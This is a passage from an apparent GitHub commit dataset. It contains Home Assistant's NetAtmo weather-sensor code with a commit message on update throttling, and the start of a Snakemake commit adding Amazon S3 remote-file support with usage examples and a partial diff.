station_data.moduleByName(module=module_name)['_id'] self.module_id=module_id[1] @property def name(self): \"\"\"Return the name of the sensor.\"\"\" return self._name @property def icon(self): \"\"\"Icon to use in the frontend, if any.\"\"\" return self._icon @property def device_class(self): \"\"\"Return the device class of the sensor.\"\"\" return self._device_class @property def state(self): \"\"\"Return the state of the device.\"\"\" return self._state @property def unit_of_measurement(self): \"\"\"Return the unit of measurement of this entity, if any.\"\"\" return self._unit_of_measurement def update(self): \"\"\"Get the latest data from NetAtmo API and updates the states.\"\"\" self.netatmo_data.update() data=self.netatmo_data.data.get(self.module_name) if data is None: _LOGGER.warning(\"No data found for %s\", self.module_name) self._state=STATE_UNKNOWN return if self.type=='temperature': self._state=round(data['Temperature'], 1) elif self.type=='humidity': self._state=data['Humidity'] elif self.type=='rain': self._state=data['Rain'] elif self.type=='sum_rain_1': self._state=data['sum_rain_1'] elif self.type=='sum_rain_24': self._state=data['sum_rain_24'] elif self.type=='noise': self._state=data['Noise'] elif self.type=='co2': self._state=data['CO2'] elif self.type=='pressure': self._state=round(data['Pressure'], 1) elif self.type=='battery_lvl': self._state=data['battery_vp'] elif self.type=='battery_vp' and self.module_id=='6': if data['battery_vp'] >=5590: self._state=\"Full\" elif data['battery_vp'] >=5180: self._state=\"High\" elif data['battery_vp'] >=4770: self._state=\"Medium\" elif data['battery_vp'] >=4360: self._state=\"Low\" elif data['battery_vp'] < 4360: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='5': if data['battery_vp'] >=5500: self._state=\"Full\" elif data['battery_vp'] >=5000: self._state=\"High\" elif data['battery_vp'] >=4500: self._state=\"Medium\" elif data['battery_vp'] >=4000: self._state=\"Low\" elif data['battery_vp'] < 4000: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='3': if data['battery_vp'] >=5640: self._state=\"Full\" elif data['battery_vp'] >=5280: self._state=\"High\" elif data['battery_vp'] >=4920: self._state=\"Medium\" elif data['battery_vp'] >=4560: self._state=\"Low\" elif data['battery_vp'] < 4560: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='2': if data['battery_vp'] >=5500: self._state=\"Full\" elif data['battery_vp'] >=5000: self._state=\"High\" elif data['battery_vp'] >=4500: self._state=\"Medium\" elif data['battery_vp'] >=4000: self._state=\"Low\" elif data['battery_vp'] < 4000: self._state=\"Very Low\" elif self.type=='min_temp': self._state=data['min_temp'] elif self.type=='max_temp': self._state=data['max_temp'] elif self.type=='windangle_value': self._state=data['WindAngle'] elif self.type=='windangle': if data['WindAngle'] >=330: self._state=\"N(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=300: self._state=\"NW(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=240: self._state=\"W(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=210: self._state=\"SW(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=150: self._state=\"S(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=120: self._state=\"SE(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=60: self._state=\"E(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=30: self._state=\"NE(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=0: self._state=\"N(%d\\xb0)\" % data['WindAngle'] elif self.type=='windstrength': self._state=data['WindStrength'] elif self.type=='gustangle_value': self._state=data['GustAngle'] elif self.type=='gustangle': if data['GustAngle'] >=330: self._state=\"N(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=300: self._state=\"NW(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=240: self._state=\"W(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=210: self._state=\"SW(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=150: self._state=\"S(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=120: self._state=\"SE(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=60: self._state=\"E(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=30: self._state=\"NE(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=0: self._state=\"N(%d\\xb0)\" % data['GustAngle'] elif self.type=='guststrength': self._state=data['GustStrength'] elif self.type=='rf_status_lvl': self._state=data['rf_status'] elif self.type=='rf_status': if data['rf_status'] >=90: self._state=\"Low\" elif data['rf_status'] >=76: self._state=\"Medium\" elif data['rf_status'] >=60: self._state=\"High\" elif data['rf_status'] <=59: self._state=\"Full\" elif self.type=='wifi_status_lvl': self._state=data['wifi_status'] elif self.type=='wifi_status': if data['wifi_status'] >=86: self._state=\"Low\" elif data['wifi_status'] >=71: self._state=\"Medium\" elif data['wifi_status'] >=56: self._state=\"High\" elif data['wifi_status'] <=55: self._state=\"Full\" class NetAtmoData(object): \"\"\"Get the latest data from NetAtmo.\"\"\" def __init__(self, auth, station): \"\"\"Initialize the data object.\"\"\" self.auth=auth self.data=None self.station_data=None self.station=station def get_module_names(self): \"\"\"Return all module available on the API as a list.\"\"\" self.update() return self.data.keys() @Throttle(MIN_TIME_BETWEEN_UPDATES) def update(self): \"\"\"Call the Netatmo API to update the data.\"\"\" import pyatmo self.station_data=pyatmo.WeatherStationData(self.auth) if self.station is not None: self.data=self.station_data.lastData( station=self.station, exclude=3600) else: self.data=self.station_data.lastData(exclude=3600) ", "sourceWithComments": "\"\"\"\nSupport for the NetAtmo Weather Service.\n\nFor more details about this platform, please refer to the documentation at\nhttps://home-assistant.io/components/sensor.netatmo/\n\"\"\"\nimport logging\nfrom datetime import timedelta\n\nimport voluptuous as vol\n\nfrom homeassistant.components.sensor import PLATFORM_SCHEMA\nfrom homeassistant.const import (\n    TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE,\n    STATE_UNKNOWN)\nfrom homeassistant.helpers.entity import Entity\nfrom homeassistant.util import Throttle\nimport homeassistant.helpers.config_validation as cv\n\n_LOGGER = logging.getLogger(__name__)\n\nCONF_MODULES = 'modules'\nCONF_STATION = 'station'\n\nDEPENDENCIES = ['netatmo']\n\n# NetAtmo Data is uploaded to server every 10 minutes\nMIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n\nSENSOR_TYPES = {\n    'temperature': ['Temperature', TEMP_CELSIUS, None,\n                    DEVICE_CLASS_TEMPERATURE],\n    'co2': ['CO2', 'ppm', 'mdi:cloud', None],\n    'pressure': ['Pressure', 'mbar', 'mdi:gauge', None],\n    'noise': ['Noise', 'dB', 'mdi:volume-high', None],\n    'humidity': ['Humidity', '%', None, DEVICE_CLASS_HUMIDITY],\n    'rain': ['Rain', 'mm', 'mdi:weather-rainy', None],\n    'sum_rain_1': ['sum_rain_1', 'mm', 'mdi:weather-rainy', None],\n    'sum_rain_24': ['sum_rain_24', 'mm', 'mdi:weather-rainy', None],\n    'battery_vp': ['Battery', '', 'mdi:battery', None],\n    'battery_lvl': ['Battery_lvl', '', 'mdi:battery', None],\n    'min_temp': ['Min Temp.', TEMP_CELSIUS, 'mdi:thermometer', None],\n    'max_temp': ['Max Temp.', TEMP_CELSIUS, 'mdi:thermometer', None],\n    'windangle': ['Angle', '', 'mdi:compass', None],\n    'windangle_value': ['Angle Value', '\u00ba', 'mdi:compass', None],\n    'windstrength': ['Strength', 'km/h', 'mdi:weather-windy', None],\n    'gustangle': ['Gust Angle', '', 'mdi:compass', None],\n    'gustangle_value': ['Gust Angle Value', '\u00ba', 'mdi:compass', None],\n    'guststrength': ['Gust Strength', 'km/h', 'mdi:weather-windy', None],\n    'rf_status': ['Radio', '', 'mdi:signal', None],\n    'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n    'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n}\n\nMODULE_SCHEMA = vol.Schema({\n    vol.Required(cv.string):\n        vol.All(cv.ensure_list, [vol.In(SENSOR_TYPES)]),\n})\n\nPLATFORM_SCHEMA = PLATFORM_SCHEMA.extend({\n    vol.Optional(CONF_STATION): cv.string,\n    vol.Optional(CONF_MODULES): MODULE_SCHEMA,\n})\n\n\ndef setup_platform(hass, config, add_devices, discovery_info=None):\n    \"\"\"Set up the available Netatmo weather sensors.\"\"\"\n    netatmo = hass.components.netatmo\n    data = NetAtmoData(netatmo.NETATMO_AUTH, config.get(CONF_STATION, None))\n\n    dev = []\n    import pyatmo\n    try:\n        if CONF_MODULES in config:\n            # Iterate each module\n            for module_name, monitored_conditions in\\\n                    config[CONF_MODULES].items():\n                # Test if module exist \"\"\"\n                if module_name not in data.get_module_names():\n                    _LOGGER.error('Module name: \"%s\" not found', module_name)\n                    continue\n                # Only create sensor for monitored \"\"\"\n                for variable in monitored_conditions:\n                    dev.append(NetAtmoSensor(data, module_name, variable))\n        else:\n            for module_name in data.get_module_names():\n                for variable in\\\n                        data.station_data.monitoredConditions(module_name):\n                    if variable in SENSOR_TYPES.keys():\n                        dev.append(NetAtmoSensor(data, module_name, variable))\n                    else:\n                        _LOGGER.warning(\"Ignoring unknown var %s for mod %s\",\n                                        variable, module_name)\n    except pyatmo.NoDevice:\n        return None\n\n    add_devices(dev, True)\n\n\nclass NetAtmoSensor(Entity):\n    \"\"\"Implementation of a Netatmo sensor.\"\"\"\n\n    def __init__(self, netatmo_data, module_name, sensor_type):\n        \"\"\"Initialize the sensor.\"\"\"\n        self._name = 'Netatmo {} {}'.format(module_name,\n                                            SENSOR_TYPES[sensor_type][0])\n        self.netatmo_data = netatmo_data\n        self.module_name = module_name\n        self.type = sensor_type\n        self._state = None\n        self._device_class = SENSOR_TYPES[self.type][3]\n        self._icon = SENSOR_TYPES[self.type][2]\n        self._unit_of_measurement = SENSOR_TYPES[self.type][1]\n        module_id = self.netatmo_data.\\\n            station_data.moduleByName(module=module_name)['_id']\n        self.module_id = module_id[1]\n\n    @property\n    def name(self):\n        \"\"\"Return the name of the sensor.\"\"\"\n        return self._name\n\n    @property\n    def icon(self):\n        \"\"\"Icon to use in the frontend, if any.\"\"\"\n        return self._icon\n\n    @property\n    def device_class(self):\n        \"\"\"Return the device class of the sensor.\"\"\"\n        return self._device_class\n\n    @property\n    def state(self):\n        \"\"\"Return the state of the device.\"\"\"\n        return self._state\n\n    @property\n    def unit_of_measurement(self):\n        \"\"\"Return the unit of measurement of this entity, if any.\"\"\"\n        return self._unit_of_measurement\n\n    def update(self):\n        \"\"\"Get the latest data from NetAtmo API and updates the states.\"\"\"\n        self.netatmo_data.update()\n        data = self.netatmo_data.data.get(self.module_name)\n\n        if data is None:\n            _LOGGER.warning(\"No data found for %s\", self.module_name)\n            self._state = STATE_UNKNOWN\n            return\n\n        if self.type == 'temperature':\n            self._state = round(data['Temperature'], 1)\n        elif self.type == 'humidity':\n            self._state = data['Humidity']\n        elif self.type == 'rain':\n            self._state = data['Rain']\n        elif self.type == 'sum_rain_1':\n            self._state = data['sum_rain_1']\n        elif self.type == 'sum_rain_24':\n            self._state = data['sum_rain_24']\n        elif self.type == 'noise':\n            self._state = data['Noise']\n        elif self.type == 'co2':\n            self._state = data['CO2']\n        elif self.type == 'pressure':\n            self._state = round(data['Pressure'], 1)\n        elif self.type == 'battery_lvl':\n            self._state = data['battery_vp']\n        elif self.type == 'battery_vp' and self.module_id == '6':\n            if data['battery_vp'] >= 5590:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5180:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4770:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4360:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4360:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '5':\n            if data['battery_vp'] >= 5500:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5000:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4500:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4000:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4000:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '3':\n            if data['battery_vp'] >= 5640:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5280:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4920:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4560:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4560:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '2':\n            if data['battery_vp'] >= 5500:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5000:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4500:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4000:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4000:\n                self._state = \"Very Low\"\n        elif self.type == 'min_temp':\n            self._state = data['min_temp']\n        elif self.type == 'max_temp':\n            self._state = data['max_temp']\n        elif self.type == 'windangle_value':\n            self._state = data['WindAngle']\n        elif self.type == 'windangle':\n            if data['WindAngle'] >= 330:\n                self._state = \"N (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 300:\n                self._state = \"NW (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 240:\n                self._state = \"W (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 210:\n                self._state = \"SW (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 150:\n                self._state = \"S (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 120:\n                self._state = \"SE (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 60:\n                self._state = \"E (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 30:\n                self._state = \"NE (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 0:\n                self._state = \"N (%d\\xb0)\" % data['WindAngle']\n        elif self.type == 'windstrength':\n            self._state = data['WindStrength']\n        elif self.type == 'gustangle_value':\n            self._state = data['GustAngle']\n        elif self.type == 'gustangle':\n            if data['GustAngle'] >= 330:\n                self._state = \"N (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 300:\n                self._state = \"NW (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 240:\n                self._state = \"W (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 210:\n                self._state = \"SW (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 150:\n                self._state = \"S (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 120:\n                self._state = \"SE (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 60:\n                self._state = \"E (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 30:\n                self._state = \"NE (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 0:\n                self._state = \"N (%d\\xb0)\" % data['GustAngle']\n        elif self.type == 'guststrength':\n            self._state = data['GustStrength']\n        elif self.type == 'rf_status_lvl':\n            self._state = data['rf_status']\n        elif self.type == 'rf_status':\n            if data['rf_status'] >= 90:\n                self._state = \"Low\"\n            elif data['rf_status'] >= 76:\n                self._state = \"Medium\"\n            elif data['rf_status'] >= 60:\n                self._state = \"High\"\n            elif data['rf_status'] <= 59:\n                self._state = \"Full\"\n        elif self.type == 'wifi_status_lvl':\n            self._state = data['wifi_status']\n        elif self.type == 'wifi_status':\n            if data['wifi_status'] >= 86:\n                self._state = \"Low\"\n            elif data['wifi_status'] >= 71:\n                self._state = \"Medium\"\n            elif data['wifi_status'] >= 56:\n                self._state = \"High\"\n            elif data['wifi_status'] <= 55:\n                self._state = \"Full\"\n\n\nclass NetAtmoData(object):\n    \"\"\"Get the latest data from NetAtmo.\"\"\"\n\n    def __init__(self, auth, station):\n        \"\"\"Initialize the data object.\"\"\"\n        self.auth = auth\n        self.data = None\n        self.station_data = None\n        self.station = station\n\n    def get_module_names(self):\n        \"\"\"Return all module available on the API as a list.\"\"\"\n        self.update()\n        return self.data.keys()\n\n    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n    def update(self):\n        \"\"\"Call the Netatmo API to update the data.\"\"\"\n        import pyatmo\n        self.station_data = pyatmo.WeatherStationData(self.auth)\n\n        if self.station is not None:\n            self.data = self.station_data.lastData(\n                station=self.station, exclude=3600)\n        else:\n            self.data = self.station_data.lastData(exclude=3600)\n"}}, "msg": "Improve NetAtmo sensors update logic (#14866)\n\n* Added a \"last update\" sensor that could be used by automations + cosmetic changes\r\n\r\n* Improved the update logic of sensor data\r\n\r\nThe platform is now continuously adjusting the refresh interval\r\nin order to synchronize with the expected next update from the\r\nNetAtmo cloud. This significantly improves reaction time of\r\nautomations while keeping the refresh time to the recommended\r\nvalue (10 minutes).\r\n\r\n* Linting\r\n\r\n* Incorporated the advanced Throttle class to support adaptive\r\nthrottling, as opposed to integrating it in the core framework.\r\n\r\nFollowing code review, it was suggested to implement the\r\nspecialised Throttle class in this platform instead of making a\r\nchange in the general util package. Except that the required change\r\n(about 4 LoC) is part of the only relevant piece of code of that\r\nclass, therefore this commit includes a full copy of the Throttle\r\nclass from homeassistant.util, plus the extra feature to support\r\nadaptive throttling.\r\n\r\n* Cosmetic changes on the introduced \"last updated\" sensor\r\n\r\n* Alternate implementation for the adaptive throttling\r\n\r\nEnsure the updates from the cloud are throttled and adapted to the\r\nlast update time provided by NetAtmo, without using the Throttle\r\ndecorator. Similar logic and similar usage of a lock to protect\r\nthe execution of the remote update.\r\n\r\n* Linting"}}, "https://github.com/CIMAC-CIDC/cidc-snakemake": {"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d": {"url": "https://api.github.com/repos/CIMAC-CIDC/cidc-snakemake/commits/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "html_url": "https://github.com/CIMAC-CIDC/cidc-snakemake/commit/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "message": "Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https://boto.readthedocs.org/en/latest/ref/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name/out.txt\")\n        output:\n            \"bucket-name/out.txt\"\n        run:\n            shell(\"cp {output[0]} ./\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote/`. This is similar in nature to the function `test_cluster_dynamic/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic.", "sha": "7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "keyword": "remote code execution protect", "diff": "diff --git a/setup.py b/setup.py\nindex dfea1ddb..97f4d865 100644\n--- a/setup.py\n+++ b/setup.py\n@@ -59,6 +59,7 @@ def run_tests(self):\n     },\n     package_data={'': ['*.css', '*.sh', '*.html']},\n     tests_require=['nose>=1.3'],\n+    install_requires=['boto>=2.38.0','filechunkio>=1.6', 'moto>=0.4.14'],\n     cmdclass={'test': NoseTestCommand},\n     classifiers=\n     [\"Development Status :: 5 - Production/Stable\", \"Environment :: Console\",\ndiff --git a/snakemake/dag.py b/snakemake/dag.py\nindex f1ead14e..e5915509 100644\n--- a/snakemake/dag.py\n+++ b/snakemake/dag.py\n@@ -10,7 +10,7 @@\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n@@ -288,6 +288,51 @@ def unneeded_files():\n             logger.info(\"Removing temporary output file {}.\".format(f))\n             f.remove()\n \n+    def handle_remote(self, job):\n+        \"\"\" Remove local files if they are no longer needed, and upload to S3. \"\"\"\n+        \n+        needed = lambda job_, f: any(\n+            f in files for j, files in self.depending[job_].items()\n+            if not self.finished(j) and self.needrun(j) and j != job)\n+\n+        remote_files = set([f for f in job.expanded_input if f.is_remote]) | set([f for f in job.expanded_output if f.is_remote])\n+        local_files = set([f for f in job.input if not f.is_remote]) | set([f for f in job.expanded_output if not f.is_remote])\n+        files_to_keep = set(f for f in remote_files if is_flagged(f, \"keep\"))\n+\n+        # remove local files from list of remote files\n+        # in case the same file is specified in both places\n+        remote_files -= local_files\n+        remote_files -= files_to_keep\n+\n+        def unneeded_files():\n+            for job_, files in self.dependencies[job].items():\n+                for f in (remote_files & files):\n+                    if not needed(job_, f) and not f.protected:\n+                        yield f\n+            for f in filterfalse(partial(needed, job), [f for f in remote_files]):\n+                if not f in self.targetfiles and not f.protected:\n+                    yield f\n+\n+        def expanded_dynamic_depending_input_files():\n+            for j in self.depending[job]:    \n+                for f in j.expanded_input:\n+                    yield f\n+\n+        unneededFiles = set(unneeded_files())\n+        unneededFiles -= set(expanded_dynamic_depending_input_files())\n+\n+        for f in [f for f in job.expanded_output if f.is_remote]:\n+            if not f.exists_remote:\n+                logger.info(\"Uploading local output file to remote: {}\".format(f))\n+                f.upload_to_remote()\n+\n+        for f in set(unneededFiles):\n+            logger.info(\"Removing local output file: {}\".format(f))\n+            f.remove()\n+\n+        job.rmdir_empty_remote_dirs()\n+\n+\n     def jobid(self, job):\n         if job not in self._jobid:\n             self._jobid[job] = len(self._jobid)\ndiff --git a/snakemake/decorators.py b/snakemake/decorators.py\nnew file mode 100644\nindex 00000000..063ddde6\n--- /dev/null\n+++ b/snakemake/decorators.py\n@@ -0,0 +1,31 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import functools\n+import inspect\n+\n+\n+def memoize(obj):\n+    cache = obj.cache = {}\n+\n+    @functools.wraps(obj)\n+    def memoizer(*args, **kwargs):\n+        key = str(args) + str(kwargs)\n+        if key not in cache:\n+            cache[key] = obj(*args, **kwargs)\n+        return cache[key]\n+\n+    return memoizer\n+\n+\n+def decAllMethods(decorator, prefix='test_'):\n+\n+    def decClass(cls):\n+        for name, m in inspect.getmembers(cls, inspect.isfunction):\n+            if prefix == None or name.startswith(prefix):\n+                setattr(cls, name, decorator(m))\n+        return cls\n+\n+    return decClass\ndiff --git a/snakemake/exceptions.py b/snakemake/exceptions.py\nindex d606c994..7440442f 100644\n--- a/snakemake/exceptions.py\n+++ b/snakemake/exceptions.py\n@@ -281,6 +281,13 @@ class IOFileException(RuleException):\n     def __init__(self, msg, lineno=None, snakefile=None):\n         super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n+class RemoteFileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n+\n+class S3FileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n class ClusterJobException(RuleException):\n     def __init__(self, job, jobid, jobscript):\ndiff --git a/snakemake/executors.py b/snakemake/executors.py\nindex 6bd01148..961e7ba4 100644\n--- a/snakemake/executors.py\n+++ b/snakemake/executors.py\n@@ -109,6 +109,7 @@ def print_job_error(self, job):\n     def finish_job(self, job):\n         self.dag.handle_touch(job)\n         self.dag.check_output(job, wait=self.latency_wait)\n+        self.dag.handle_remote(job)\n         self.dag.handle_protected(job)\n         self.dag.handle_temp(job)\n \ndiff --git a/snakemake/io.py b/snakemake/io.py\nindex 0ba9cbde..3e326286 100644\n--- a/snakemake/io.py\n+++ b/snakemake/io.py\n@@ -8,11 +8,12 @@\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n@@ -45,9 +46,46 @@ def __new__(cls, file):\n         obj._file = file\n         obj.rule = None\n         obj._regex = None\n+\n         return obj\n \n+    def __init__(self, file):\n+        self._remote_object = None\n+        if self.is_remote:\n+            additional_args = get_flag_value(self._file, \"additional_remote_args\") if get_flag_value(self._file, \"additional_remote_args\") else []\n+            additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+            self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, *additional_args, **additional_kwargs)\n+        pass\n+\n+    def _referToRemote(func):\n+        \"\"\" \n+            A decorator so that if the file is remote and has a version \n+            of the same file-related function, call that version instead. \n+        \"\"\"\n+        @functools.wraps(func)\n+        def wrapper(self, *args, **kwargs):\n+            